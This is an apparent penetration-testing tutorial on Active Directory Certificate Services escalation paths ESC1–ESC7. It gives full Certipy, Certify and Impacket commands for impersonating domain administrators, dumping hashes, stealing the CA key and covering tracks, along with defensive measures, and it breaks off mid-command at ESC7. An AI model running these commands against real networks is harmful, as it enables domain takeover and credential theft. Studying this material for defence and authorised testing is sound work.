# AD CS (Active Directory Certificate Services)

## Table of Contents

1. Introduction to AD CS Attacks
2. Active Directory Certificate Services Fundamentals
3. Certificate-Based Authentication in AD
4. Reconnaissance and Enumeration of AD CS
5. ESC1 – Misconfigured Certificate Templates (Enrollee Supplies Subject)
6. ESC2 – Any Purpose EKU / No EKU Abuse
7. ESC3 – Enrollment Agent Certificate Abuse
8. ESC4 – Vulnerable Certificate Template Access Controls
9. ESC5 – Vulnerable PKI Object Access Controls (CA Server Compromise)
10. ESC6 – EDITF_ATTRIBUTESUBJECTALTNAME2 Flag Abuse
11. ESC7 – Vulnerable Certificate Authority Access Controls
12. ESC8 – NTLM Relay to AD CS HTTP Endpoints
13. ESC9 & ESC10 – Weak Certificate Mapping Attacks
14. ESC11 – NTLM Relay to RPC-Based Enrollment
15. Golden Certificate Attack (DPERSIST1)
16. Shadow Credentials Attack
17. Certificate Theft Techniques
18. Detection and Defensive Measures
19. Real-World Scenarios and Case Studies

---

## 1. Introduction to AD CS Attacks

### What are AD CS Attacks?

AD CS attacks are a family of privilege escalation, lateral movement, and persistence techniques that exploit misconfigurations in Active Directory Certificate Services. These attacks target the Public Key Infrastructure (PKI) that organizations use to issue digital certificates for authentication, encryption, and code signing.

First comprehensively documented by Will Schroeder and Lee Christensen of SpecterOps in their 2021 whitepaper "Certified Pre-Owned," these attacks have since expanded from the original 8 escalation paths (ESC1-ESC8) to 16 known techniques (ESC1-ESC16) as of 2025.

### Attack Classification

**Attack Type**: Credential Access / Privilege Escalation / Persistence (MITRE ATT&CK T1649) **Prerequisites**:

- Domain network access (most attacks require at least low-privilege domain authentication)
- AD CS deployed in the environment (extremely common in enterprise AD)
- Misconfigured certificate templates or CA settings

**Impact Level**: Critical — Can lead to full domain compromise, impersonation of any user including Domain Admins, and long-term persistence that survives password resets

### Why AD CS Attacks are Significant

**Key Advantages for Attackers:**

- Certificates persist beyond password resets — even if a compromised user changes their password, the certificate remains valid for its entire validity period (often 1-5 years)
- Misconfigurations are extremely common — most organizations have at least one exploitable AD CS issue
- Typical vulnerability scanners do not detect AD CS misconfigurations
- Low-privilege domain users can often escalate directly to Domain Admin
- Golden Certificates provide persistence comparable to Golden Tickets but are harder to remediate
- Certificate-based authentication bypasses many MFA implementations
- Offline attack capability — hash cracking or certificate forging can be done on attacker-controlled systems

**Common Scenarios:**

- Privilege escalation from any domain user to Domain Admin via ESC1
- Persistent domain access after initial compromise via Golden Certificates
- NTLM relay attacks combined with certificate enrollment for machine account takeover
- Bypassing password rotation policies using long-lived certificates
- Cross-domain attacks in multi-forest environments via trusted CA certificates

---

## 2. Active Directory Certificate Services Fundamentals

### What is AD CS?

Active Directory Certificate Services is a Windows Server role that provides a Public Key Infrastructure (PKI) for issuing and managing digital certificates. These certificates are used throughout the organization for:

- User and computer authentication (Kerberos PKINIT, Smart Card logon)
- Email encryption and signing (S/MIME)
- TLS/SSL for web services
- Code signing
- EFS (Encrypting File System)
- VPN authentication

### Key Components

#### Certificate Authority (CA)

The CA is the server that issues and manages certificates. There are two types:

- **Enterprise CA**: Integrated with Active Directory, uses certificate templates, publishes certificates to AD. This is the type attackers target.
- **Standalone CA**: Not integrated with AD, typically used as an offline root CA.

In a typical deployment:

```
Root CA (Offline, Standalone)
   └── Subordinate/Issuing CA (Online, Enterprise)
         ├── Issues certificates from templates
         ├── Publishes to AD (NTAuthCertificates)
         └── Handles enrollment requests
```

The CA's certificate and private key are the crown jewels. The private key signs every certificate the CA issues. If an attacker obtains this key, they can forge certificates for any user in the domain (Golden Certificate attack).

#### Certificate Templates

Certificate templates are blueprints stored in Active Directory that define the rules for certificate issuance. They control:

- **Who can enroll**: Which users/groups can request certificates from this template
- **What the certificate can do**: Extended Key Usages (EKUs) define purposes like Client Authentication, Server Authentication, Code Signing, etc.
- **How the subject is determined**: Whether the subject name comes from AD or is supplied by the requester
- **Approval requirements**: Whether a CA manager must approve the request
- **Validity period**: How long the issued certificate remains valid
- **Signature requirements**: Whether an existing certificate must co-sign the request

Critical template properties that attackers evaluate:

```
Template Name:           VulnerableTemplate
Enabled:                 True
Client Authentication:   True
Enrollee Supplies Subject: True     ← Dangerous: allows SAN injection
Enrollment Rights:       Domain Users ← Dangerous: too permissive
Manager Approval:        False       ← No gatekeeper
Authorized Signatures:   0          ← No co-signing required
```

#### Extended Key Usages (EKUs)

EKUs define what a certificate can be used for. The following EKUs are relevant to AD CS attacks:

| EKU                          | OID                    | Significance                                |
| ---------------------------- | ---------------------- | ------------------------------------------- |
| Client Authentication        | 1.3.6.1.5.5.7.3.2      | Allows Kerberos PKINIT authentication to AD |
| PKINIT Client Authentication | 1.3.6.1.5.2.3.4        | Explicit PKINIT authentication              |
| Smart Card Logon             | 1.3.6.1.4.1.311.20.2.2 | Smart card-based AD authentication          |
| Any Purpose                  | 2.5.29.37.0            | Certificate can be used for anything        |
| SubCA                        | (no EKU)               | Subordinate CA — can sign certificates      |
| Certificate Request Agent    | 1.3.6.1.4.1.311.20.2.1 | Can enroll on behalf of other users         |

Any template with Client Authentication, PKINIT Client Authentication, Smart Card Logon, Any Purpose, or SubCA (no EKU) can potentially be used for domain authentication.

#### NTAuthCertificates

This is an AD forest-wide object that stores CA certificates trusted for NT (AD) authentication. When a user authenticates with a certificate, the domain controller checks whether the issuing CA's certificate exists in NTAuthCertificates. If the CA is trusted, the certificate chain is valid for AD authentication.

This is why a stolen CA private key is so devastating — the CA is already registered in NTAuthCertificates, so any certificate signed by that key will be trusted domain-wide.

### Certificate Enrollment Process

Understanding the normal enrollment flow helps explain how each ESC attack subverts the process:

```
Step 1: Client identifies a certificate template
Step 2: Client generates a key pair and Certificate Signing Request (CSR)
Step 3: Client submits CSR to the Enterprise CA
Step 4: CA validates:
        - Does the requester have Enroll permissions on the template?
        - Does the CSR meet template requirements?
        - Is manager approval required? (If yes, request is held pending)
        - Is an authorized signature required? (If yes, verify co-signer)
Step 5: CA issues the certificate, signed with the CA's private key
Step 6: Client receives the certificate and installs it
Step 7: Client can now use the certificate for authentication (PKINIT)
```

---

## 3. Certificate-Based Authentication in AD

### PKINIT Authentication Flow

Certificate-based authentication in Active Directory uses the PKINIT (Public Key Cryptography for Initial Authentication) extension to Kerberos. This is the mechanism that AD CS attacks leverage for impersonation.

```
Step 1: AS-REQ with Certificate
   Client → KDC: "I want to authenticate. Here is my certificate."
   - Client signs a timestamp with the certificate's private key
   - Certificate is included in the padata field of the AS-REQ

Step 2: KDC Validation
   KDC validates:
   - Certificate chain (up to a CA in NTAuthCertificates)
   - Certificate is not expired or revoked
   - EKU allows client authentication
   - Subject maps to a valid AD account (via UPN or SID in SAN)

Step 3: AS-REP with TGT
   KDC → Client: TGT + session key
   - The TGT is issued for the identity in the certificate's SAN
   - If the SAN says "administrator@domain.com", the TGT is for Administrator
```

This is the critical insight: **the KDC trusts the identity in the certificate**. If an attacker can obtain or forge a certificate with a privileged user's identity in the SAN, the KDC will issue a TGT for that user. The attacker never needs the user's password.

### Certificate-to-Account Mapping

The domain controller must map the certificate to an AD account. There are two mapping methods, and their configuration determines the viability of certain attacks (especially ESC9 and ESC10):

**Weak Mapping (Legacy)**:

- Maps via UPN in the SAN (Subject Alternative Name)
- If certificate SAN says `UPN: admin@domain.com`, DC finds the account with that UPN
- Vulnerable to impersonation if attacker can control the SAN

**Strong Mapping (KB5014754)**:

- Maps via SID in the SAN or via the Security Extension (szOID_NTDS_CA_SECURITY_EXT)
- The SID is cryptographically bound to the certificate
- Much harder to forge or manipulate

Microsoft has been rolling out strong certificate mapping enforcement in phases since 2022, with full enforcement expected to be the default. However, many environments still operate in "compatibility mode" (StrongCertificateBindingEnforcement = 1) or even disabled mode (= 0), leaving them vulnerable.

### Authenticating with a Certificate Using Certipy

Once you have a certificate (whether legitimately requested, stolen, or forged), authentication is straightforward:

```bash
# Authenticate using a PFX certificate to get a TGT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# This returns:
# - A TGT in a .ccache file
# - The user's NT hash (via U2U)
```

The returned TGT can be used with tools like Impacket for further attacks, and the NT hash enables Pass-the-Hash.

---

## 4. Reconnaissance and Enumeration of AD CS

### Why Enumeration Comes First

Every AD CS attack begins with enumeration. Before exploiting any misconfiguration, you need to:

1. Determine if AD CS is deployed in the environment
2. Identify all Certificate Authorities and their configurations
3. Enumerate all certificate templates and their properties
4. Identify which templates are vulnerable to which ESC attacks
5. Determine your current user's enrollment rights

### Primary Tools

#### Certipy (Python — Preferred for Linux/Kali)

Certipy is the most comprehensive tool for AD CS enumeration and exploitation. It was developed by Oliver Lyak and supports ESC1 through ESC16.

```bash
# Install Certipy
pip install certipy-ad

# Full AD CS enumeration
certipy find -u 'lowprivuser@domain.com' -p 'Password123' -dc-ip 10.10.10.1

# Enumerate and show ONLY vulnerable templates/CAs
certipy find -u 'lowprivuser@domain.com' -p 'Password123' -dc-ip 10.10.10.1 -vulnerable

# Output formats: stdout, JSON, and text files
# Certipy generates detailed reports showing:
#   - Certificate Authorities (name, DNS, permissions)
#   - Certificate Templates (all properties, permissions, ESC flags)
#   - Identified vulnerabilities with ESC classification
```

#### Certify (C# — Preferred for Windows)

Certify is the C# counterpart developed by SpecterOps (GhostPack). Version 2.0 (released August 2025) added support for newer ESC techniques.

```powershell
# Enumerate all CAs
Certify.exe cas

# Enumerate all templates
Certify.exe find

# Find vulnerable templates only
Certify.exe find /vulnerable

# Check specific template
Certify.exe find /template:VulnerableTemplate
```

#### Additional Enumeration Tools

**BloodHound / SharpHound**: Modern versions of BloodHound can ingest AD CS data and visualize attack paths from users to Domain Admin via certificate abuse.

```bash
# Certipy can output BloodHound-compatible data
certipy find -u 'user@domain.com' -p 'pass' -dc-ip 10.10.10.1 -old-bloodhound
```

**PowerView / ADModule**: Can be used for manual LDAP queries against certificate template objects.

```powershell
# Find all certificate templates
Get-ADObject -Filter {objectClass -eq 'pKICertificateTemplate'} -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com' -Properties *

# Find CAs
Get-ADObject -Filter {objectClass -eq 'pKIEnrollmentService'} -SearchBase 'CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com' -Properties *
```

**ldapsearch (Linux)**:

```bash
# Enumerate certificate templates
ldapsearch -x -H ldap://10.10.10.1 -D "user@domain.com" -w "Password123" \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" \
  "(objectClass=pKICertificateTemplate)" name msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag pKIExtendedKeyUsage
```

### Understanding Certipy Output

When you run `certipy find -vulnerable`, the output categorizes findings by ESC number. Here is what to look for:

```
Certificate Templates
  0
    Template Name                       : VulnerableTemplate
    Display Name                        : Vulnerable Template
    Certificate Authorities             : CORP-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True          ← ESC1 indicator
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False          ← No gatekeeper
    Requires Key Archival               : False
    Authorized Signatures Required      : 0              ← No co-signing
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DOMAIN\Domain Users  ← Too permissive
      Object Control Permissions
        Owner                           : DOMAIN\Domain Admins
        Write Owner Principals          : DOMAIN\Domain Admins
        Write Dacl Principals           : DOMAIN\Domain Admins
        Write Property Principals       : DOMAIN\Domain Admins
    [!] Vulnerabilities
      ESC1                              : 'DOMAIN\\Domain Users' can enroll, enrollee supplies subject is enabled, and template allows client authentication.
```

### Reconnaissance Checklist

For each engagement, confirm the following before proceeding to exploitation:

- [ ] AD CS is deployed (at least one Enterprise CA exists)
- [ ] Identify all CAs (name, DNS hostname, CA certificate thumbprint)
- [ ] Identify web enrollment endpoints (HTTP/HTTPS on CA or separate IIS servers)
- [ ] Enumerate all enabled certificate templates
- [ ] Check enrollment permissions for your current user/groups
- [ ] Identify ESC-flagged templates (use `-vulnerable` flag)
- [ ] Check CA-level settings (EDITF_ATTRIBUTESUBJECTALTNAME2, manager approval, etc.)
- [ ] Verify certificate mapping enforcement (StrongCertificateBindingEnforcement registry key)
- [ ] Check for HTTP enrollment endpoints without EPA (ESC8 target)
- [ ] Run BloodHound ingest for visual attack path analysis

---

## 5. ESC1 – Misconfigured Certificate Templates (Enrollee Supplies Subject)

### Overview

ESC1 is the most commonly exploited AD CS vulnerability and often the easiest path from low-privilege domain user to Domain Admin. The attack exploits certificate templates that allow the requester to specify their own Subject Alternative Name (SAN), combined with the ability for low-privilege users to enroll.

### How ESC1 Works

When a certificate template has the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled in the `msPKI-Certificate-Name-Flag` attribute, the person requesting the certificate can specify an arbitrary SAN (Subject Alternative Name) value. This means a low-privilege user can request a certificate and specify that it should contain the UPN (User Principal Name) of a Domain Admin — or any other user in the domain.

Because the KDC trusts the identity in the SAN for PKINIT authentication, the attacker can then use this certificate to authenticate as the impersonated user and receive a TGT for their account.

### Vulnerability Requirements

All of the following conditions must be met for ESC1 to be exploitable:

1. **Enterprise CA is enabled**: The template must be enabled on at least one Enterprise CA
2. **Enrollee Supplies Subject**: The `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag is set, allowing the requester to define the SAN
3. **Client Authentication EKU**: The template includes an EKU that permits AD authentication (Client Authentication, PKINIT Client Authentication, Smart Card Logon, Any Purpose, or SubCA/No EKU)
4. **Low-Privilege Enrollment**: A low-privilege group (e.g., Domain Users, Authenticated Users) has Enroll permissions
5. **No Manager Approval**: The template does not require a CA manager to approve the request
6. **No Authorized Signatures**: The template does not require an existing certificate to co-sign the request (or the signature requirement is set to 0)

### Reconnaissance: Finding ESC1

```bash
# Using Certipy - automated detection
certipy find -u 'lowprivuser@domain.com' -p 'Password123' -dc-ip 10.10.10.1 -vulnerable

# Look for output showing:
# [!] Vulnerabilities
#   ESC1: 'DOMAIN\Domain Users' can enroll, enrollee supplies subject is enabled,
#          and template allows client authentication.
```

```powershell
# Using Certify on Windows
Certify.exe find /vulnerable

# Manual check - look for templates where:
# msPKI-Certificate-Name-Flag contains ENROLLEE_SUPPLIES_SUBJECT (value: 1)
# pKIExtendedKeyUsage contains Client Authentication OID
# Security descriptor grants Enroll to Domain Users
```

### Exploitation

#### Step 1: Request a Certificate with a Spoofed SAN

```bash
# Request a certificate impersonating the Domain Admin
certipy req -u 'lowprivuser@domain.com' -p 'Password123' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@domain.com'

# Output: administrator.pfx (certificate + private key)
```

```powershell
# Using Certify on Windows
Certify.exe request /ca:ca01.domain.com\DOMAIN-CA /template:VulnerableTemplate /altname:administrator
```

#### Step 2: Authenticate with the Certificate

```bash
# Use the certificate to get a TGT for Administrator
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Output:
# [*] Using principal: administrator@domain.com
# [*] Trying to get TGT...
# [*] Got TGT
# [*] Saved credential cache to 'administrator.ccache'
# [*] Trying to retrieve NT hash for 'administrator'
# [*] Got hash for 'administrator@domain.com': aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

#### Step 3: Use the Credentials

```bash
# Set the Kerberos ticket for use with Impacket
export KRB5CCNAME=administrator.ccache

# DCSync using the admin TGT
impacket-secretsdump -k -no-pass domain.com/administrator@dc01.domain.com

# Or use the NT hash for Pass-the-Hash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe domain.com/administrator@dc01.domain.com
```

### Important Note: KB5014754 (Strong Certificate Mapping)

Microsoft introduced certificate mapping enforcement that can affect ESC1 exploitation:

- **StrongCertificateBindingEnforcement = 0 (Disabled)**: ESC1 works as described above
- **StrongCertificateBindingEnforcement = 1 (Compatibility Mode)**: ESC1 still works, but DC logs warnings (Event ID 39). This is the current default on many systems.
- **StrongCertificateBindingEnforcement = 2 (Full Enforcement)**: ESC1 may fail unless the certificate also contains the target user's SID in the SAN. Certipy supports adding the SID:

```bash
# For environments with full enforcement, include the target SID
certipy req -u 'lowprivuser@domain.com' -p 'Password123' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@domain.com' \
  -sid 'S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500'
```

### Defensive Measures

- **Disable "Enrollee Supplies Subject"**: Set the subject name source to "Build from this Active Directory information" for authentication templates
- **Restrict Enrollment Rights**: Only grant Enroll permissions to specific security groups that require the template — never Domain Users or Authenticated Users
- **Enable Manager Approval**: Require CA administrator approval for sensitive templates
- **Require Authorized Signatures**: Require an existing certificate to co-sign enrollment requests
- **Monitor Event IDs 4886 (Certificate Request) and 4887 (Certificate Issued)**: Alert on mismatches between the requester and the certificate subject
- **Enable Strong Certificate Mapping (StrongCertificateBindingEnforcement = 2)**: Forces SID-based certificate mapping

---

## 6. ESC2 – Any Purpose EKU / No EKU Abuse

### Overview

ESC2 targets certificate templates configured with the "Any Purpose" EKU (OID 2.5.29.37.0) or with no EKU restrictions at all. An "Any Purpose" certificate can be used for anything — including client authentication to AD. A certificate with no EKU acts as a subordinate CA certificate, which is even more dangerous.

### How ESC2 Works

When a template has the Any Purpose EKU, any certificate issued from that template can be used for client authentication, server authentication, code signing, or any other purpose. This is problematic when the template is accessible to low-privilege users.

A template with no EKU at all is treated as a SubCA certificate. This means the issued certificate can technically sign other certificates, though practical exploitation of this requires additional conditions.

### Vulnerability Requirements

1. Enterprise CA is enabled for the template
2. Template has **Any Purpose** EKU or **No EKU** defined
3. Low-privilege users have Enroll permissions
4. No manager approval required
5. No authorized signatures required

### Important Caveat

ESC2 alone does not allow direct user impersonation like ESC1. The requester cannot specify an arbitrary SAN unless the `ENROLLEE_SUPPLIES_SUBJECT` flag is also set (which would make it ESC1). ESC2 certificates become truly dangerous when combined with:

- ESC6 (CA-wide EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabling SAN injection)
- Weak certificate mapping (ESC9/ESC10 conditions)
- The certificate being used as a SubCA to issue further certificates

### Reconnaissance

```bash
# Certipy will flag ESC2 templates
certipy find -u 'user@domain.com' -p 'pass' -dc-ip 10.10.10.1 -vulnerable

# Look for:
# Extended Key Usage: Any Purpose
# or
# Extended Key Usage: <empty/None>
```

### Exploitation

```bash
# Request a certificate from the Any Purpose template
certipy req -u 'user@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
  -template 'AnyPurposeTemplate'

# If the template also allows SAN specification (ESC1+ESC2):
certipy req -u 'user@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
  -template 'AnyPurposeTemplate' \
  -upn 'administrator@domain.com'

# Authenticate with the certificate
certipy auth -pfx user.pfx -dc-ip 10.10.10.1
```

### Defensive Measures

- Never use the "Any Purpose" EKU unless absolutely required
- Always define specific, restrictive EKUs on templates
- Disable or remove templates with no EKU unless they serve a documented purpose
- Apply the same enrollment restrictions as ESC1 mitigations

---

## 7. ESC3 – Enrollment Agent Certificate Abuse

### Overview

ESC3 is a two-stage attack that abuses the Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1). An Enrollment Agent certificate allows its holder to enroll for certificates on behalf of other users. If a low-privilege user can obtain an Enrollment Agent certificate, they can use it to request certificates for privileged users from a second template.

### How ESC3 Works

**Stage 1**: The attacker requests a certificate from a template with the Certificate Request Agent EKU. This template must be enrollable by the attacker and must not require manager approval.

**Stage 2**: The attacker uses the Enrollment Agent certificate to co-sign a certificate request on behalf of a privileged user (e.g., Domain Admin) from a different template that requires an authorized signature (specifically, an enrollment agent signature).

### Vulnerability Requirements

**Stage 1 Template (Enrollment Agent Template)**:

1. Contains the Certificate Request Agent EKU
2. Low-privilege users have Enroll permissions
3. No manager approval required

**Stage 2 Template (Target Template)**:

1. Contains an EKU that allows AD authentication (Client Authentication, etc.)
2. Requires an authorized signature from an Enrollment Agent
3. Application policy allows Certificate Request Agent
4. Allows enrollment on behalf of other users

### Exploitation

```bash
# Stage 1: Obtain an Enrollment Agent certificate
certipy req -u 'user@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
  -template 'EnrollmentAgentTemplate'

# Stage 2: Use the Enrollment Agent cert to request on behalf of Administrator
certipy req -u 'user@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
  -template 'UserAuthTemplate' \
  -on-behalf-of 'domain\administrator' \
  -pfx enrollment_agent.pfx

# Stage 3: Authenticate as Administrator
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### Defensive Measures

- Restrict Enrollment Agent templates to dedicated, hardened service accounts
- Never grant Enrollment Agent Enroll permissions to Domain Users
- Configure enrollment restrictions on the CA to limit which agents can enroll for which templates/users
- Use the CA's "Restrict enrollment agents" feature to map specific agents to specific templates and target users
- Monitor for Certificate Request Agent certificate enrollments (Event ID 4886/4887)

---

## 8. ESC4 – Vulnerable Certificate Template Access Controls

### Overview

ESC4 exploits overly permissive Access Control Entries (ACEs) on certificate template objects in Active Directory. If a low-privilege user has write permissions to a certificate template object, they can modify the template's properties to introduce vulnerabilities — for example, enabling the `ENROLLEE_SUPPLIES_SUBJECT` flag to convert the template into an ESC1-vulnerable template.

### How ESC4 Works

Certificate templates are AD objects stored in the Configuration partition. Like all AD objects, they have a security descriptor (DACL) that controls who can read, modify, or manage them. If a low-privilege user or group has any of the following permissions on a template, ESC4 is possible:

- **Owner**: Full control over the object
- **FullControl / GenericAll**: Can modify any property
- **WriteProperty / GenericWrite**: Can modify specific properties
- **WriteDacl**: Can modify the template's permissions (then grant themselves further rights)
- **WriteOwner**: Can take ownership (then grant themselves further rights)

With write access, an attacker modifies the template to make it vulnerable (e.g., enabling SAN specification, adding Client Authentication EKU, adding enrollment rights), exploits the now-vulnerable template as ESC1, and then optionally restores the original template configuration to cover their tracks.

### Reconnaissance

```bash
# Certipy enumerates template permissions
certipy find -u 'user@domain.com' -p 'pass' -dc-ip 10.10.10.1 -vulnerable

# Look for Object Control Permissions showing your user/groups with:
#   Write Property Principals
#   Write Dacl Principals
#   Write Owner Principals
# pointing to low-privilege groups
```

```powershell
# Certify 2.0 can also detect ESC4
Certify.exe find /vulnerable

# Manual check with PowerView
Get-DomainObjectAcl -SearchBase 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|WriteDacl|WriteOwner'}
```

### Exploitation

```bash
# Step 1: Save the current template configuration (for later restoration)
certipy template -u 'user@domain.com' -p 'pass' -dc-ip 10.10.10.1 \
  -template 'TargetTemplate' -save-old

# Step 2: Modify the template to make it vulnerable to ESC1
certipy template -u 'user@domain.com' -p 'pass' -dc-ip 10.10.10.1 \
  -template 'TargetTemplate' -write-default-configuration

# This sets:
#   - Enrollee Supplies Subject = True
#   - Client Authentication EKU = Enabled
#   - Enrollment rights for the attacker

# Step 3: Exploit as ESC1
certipy req -u 'user@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
  -template 'TargetTemplate' \
  -upn 'administrator@domain.com'

# Step 4: Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 5: Restore original template configuration (OPSEC)
certipy template -u 'user@domain.com' -p 'pass' -dc-ip 10.10.10.1 \
  -template 'TargetTemplate' -configuration TargetTemplate.json
```

```powershell
# Using Certify 2.0 on Windows
# Add Client Authentication EKU to a template
Certify.exe manage-template /template:TargetTemplate /client-auth

# Toggle manager approval off
Certify.exe manage-template /template:TargetTemplate /manager-approval:false
```

### Defensive Measures

- Audit template DACLs regularly — no low-privilege groups should have write access
- Use the principle of least privilege for template management
- Monitor for template modifications via AD replication metadata or LDAP modification events
- Enable AD object auditing on the Certificate Templates container
- Consider using AdminSDHolder-style protections for critical template objects

---

## 9. ESC5 – Vulnerable PKI Object Access Controls (CA Server Compromise)

### Overview

ESC5 extends the concept of ESC4 beyond templates to all PKI-related objects in Active Directory. This includes the CA server's AD object, the CA's enrollment service object, and the NTAuthCertificates object. If an attacker can modify these objects or gain local admin on the CA server, they can compromise the entire PKI infrastructure.

### How ESC5 Works

ESC5 encompasses several scenarios:

1. **CA Server Local Admin**: If an attacker gains local administrator access to the CA server, they can extract the CA's private key and certificate, enabling Golden Certificate attacks (DPERSIST1).
    
2. **CA AD Object Permissions**: If an attacker has write permissions on the CA's AD computer object, they may be able to configure resource-based constrained delegation or other attacks to gain local admin on the CA server.
    
3. **PKI Container Permissions**: Write access to the `CN=Public Key Services` container or sub-containers can allow an attacker to modify CA configurations, template objects, or the NTAuthCertificates object.
    

### Exploitation: CA Private Key Extraction

```bash
# If you have local admin on the CA server, backup the CA cert and private key
certipy ca -backup -u 'admin@domain.com' -p 'AdminPass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA'

# Output: DOMAIN-CA.pfx (CA certificate + private key)
# This PFX can now be used for Golden Certificate attacks (see Section 15)
```

### Defensive Measures

- Treat CA servers as Tier 0 assets (same protection level as Domain Controllers)
- Restrict local admin access on CA servers
- Audit permissions on all PKI objects in the Configuration partition
- Use HSM (Hardware Security Module) or TPM to protect CA private keys
- Monitor CA backup operations

---

## 10. ESC6 – EDITF_ATTRIBUTESUBJECTALTNAME2 Flag Abuse

### Overview

ESC6 is a CA-wide misconfiguration rather than a template-specific one. When the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is enabled on the Certificate Authority, it allows any certificate requester to specify a Subject Alternative Name (SAN) in their request — regardless of what the template says. This effectively turns every template on the CA into an ESC1-vulnerable template.

### How ESC6 Works

The `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is a CA policy module setting. When enabled, the CA accepts SAN values submitted in the certificate request even if the template does not have `ENROLLEE_SUPPLIES_SUBJECT` set. This means:

- A template that normally builds the subject from Active Directory (safe configuration) will still accept attacker-supplied SAN values
- Every template with Client Authentication EKU on that CA becomes exploitable

This flag was commonly enabled by administrators following Microsoft documentation for specific scenarios, without understanding the security implications.

### Reconnaissance

```bash
# Certipy checks this flag during enumeration
certipy find -u 'user@domain.com' -p 'pass' -dc-ip 10.10.10.1 -vulnerable

# Look for CA-level vulnerability:
# [!] Vulnerabilities
#   ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled
```

```powershell
# Check the flag manually on the CA server
certutil -config "ca01.domain.com\DOMAIN-CA" -getreg policy\EditFlags

# If the output includes EDITF_ATTRIBUTESUBJECTALTNAME2, the CA is vulnerable
```

### Exploitation

```bash
# Request a certificate from ANY template that has Client Authentication EKU
# The -upn flag works even if the template doesn't have ENROLLEE_SUPPLIES_SUBJECT
certipy req -u 'user@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
  -template 'User' \
  -upn 'administrator@domain.com'

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### Important Note: Post-Patch Behavior

After Microsoft's May 2022 patches (KB5014754), ESC6 exploitation may require additional conditions. On patched CAs, the security extension with the requester's SID is embedded in issued certificates, and the DC may reject certificates where the SAN doesn't match the requester's actual account. However, this depends on the StrongCertificateBindingEnforcement setting.

### Defensive Measures

- **Disable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag** on all CAs:

```powershell
# On the CA server
certutil -config "ca01.domain.com\DOMAIN-CA" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

- Audit CA policy flags regularly
- Apply Microsoft KB5014754 patches and enable strong certificate mapping

---

## 11. ESC7 – Vulnerable Certificate Authority Access Controls

### Overview

ESC7 exploits overly permissive access controls on the Certificate Authority itself. If a low-privilege user has the `ManageCA` (CA Administrator) or `ManageCertificates` (Certificate Manager/Officer) rights on the CA, they can manipulate the CA to issue certificates they shouldn't be able to obtain.

### How ESC7 Works

**Scenario 1: ManageCA + ManageCertificates**

A user with ManageCA rights can grant themselves ManageCertificates rights. A user with ManageCertificates rights can approve pending certificate requests. The attack chain:

1. Use ManageCA to enable a vulnerable template (like SubCA) on the CA
2. Request a certificate from that template (the request may be denied or marked pending)
3. Use ManageCertificates to approve the pending request
4. Retrieve the issued certificate

**Scenario 2: ManageCA to Enable EDITF_ATTRIBUTESUBJECTALTNAME2**

A user with ManageCA can modify CA policy settings, including enabling the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag — converting ESC7 into ESC6.

### Exploitation

```bash
# Step 1: Check if you have ManageCA rights
certipy find -u 'user@domain.com' -p 'pass' -dc-ip 10.10.10.1 -vulnerable

# Step 2: Add yourself as a Certificate Manager (if you have ManageCA)
certipy ca -u 'user@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
  -add-officer 'user'

# Step 3: Enable the SubCA template on the CA
certipy ca -u 'user@domain.com' -p 'pass' \
  -dc-ip 10.10.10.1 \
  -target ca01.domain.com \
  -ca 'DOMAIN-CA' \
